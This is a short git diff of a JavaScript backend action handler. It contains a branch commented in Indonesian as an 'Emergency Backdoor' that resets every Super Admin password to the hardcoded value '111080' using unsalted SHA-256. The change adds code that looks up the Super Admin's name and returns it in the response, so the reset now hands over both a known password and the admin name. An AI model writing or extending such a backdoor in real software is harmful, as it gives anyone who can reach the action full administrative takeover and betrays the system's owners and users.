@@ -294,8 +294,10 @@ async function handleAction(action, payload, req) {
       // Pintu Belakang Darurat
       const defaultPassword = "111080";
       const hashed = crypto.createHash("sha256").update(defaultPassword).digest("hex");
+      const [users] = await db.query("SELECT name FROM users WHERE role = 'Super Admin' LIMIT 1");
+      const adminName = users.length > 0 ? users[0].name : "";
       await db.query("UPDATE users SET password_hash = ? WHERE role = 'Super Admin'", [hashed]);
-      return { message: `Password Super Admin berhasil di-reset ke default!` };
+      return { message: `Password Super Admin berhasil di-reset!`, name: adminName };
     }
   };
 
